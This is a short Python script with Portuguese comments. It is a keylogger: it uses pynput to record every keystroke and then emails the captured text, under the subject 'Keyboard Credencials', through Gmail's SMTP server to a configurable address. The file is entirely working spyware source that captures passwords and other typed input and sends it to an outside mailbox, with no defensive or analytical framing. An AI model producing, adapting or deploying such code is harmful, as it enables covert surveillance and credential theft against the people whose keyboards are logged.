import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

teclas = []

def processar_tecla(tecla):
    if hasattr(tecla, 'char'):
        # Se a tecla tem um atributo 'char', é um caractere imprimível (letra, número, etc.)
        return tecla.char
    elif tecla == Key.space:
        return ' '  # Trate a tecla de espaço separadamente
    else:
        # Se não é um caractere imprimível, retorne a representação da tecla como string
        return str(tecla)

def log(tecla):
    tecla_processada = processar_tecla(tecla)
    if tecla_processada is not None:
        teclas.append(tecla_processada)

try:
    with Listener(on_press=log) as monitor:
        monitor.join()

except KeyboardInterrupt or AttributeError:
    print('Encerrando...')

finally:
    resultado = ' '.join(teclas)


# Configurações do remetente
remetente_email = ""
remetente_senha = ""

# Configurações do destinatário
destinatario_email = ""

# Configurações do servidor SMTP do Gmail
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Criar o objeto MIMEText
mensagem = MIMEMultipart()
mensagem['From'] = remetente_email
mensagem['To'] = destinatario_email
mensagem['Subject'] = "Keyboard Credencials"


corpo_email = f"""##########

Keyboard:{resultado}

##########"""

# Adicionar o corpo do email
mensagem.attach(MIMEText(corpo_email, 'plain'))

# Configurar a conexão SMTP
with smtplib.SMTP(smtp_server, smtp_port) as server:
    # Iniciar o servidor
    server.starttls()

    # Faça login no servidor SMTP
    server.login(remetente_email, remetente_senha)

    # Enviar o email
    server.send_message(mensagem)

print("Email enviado com sucesso!")
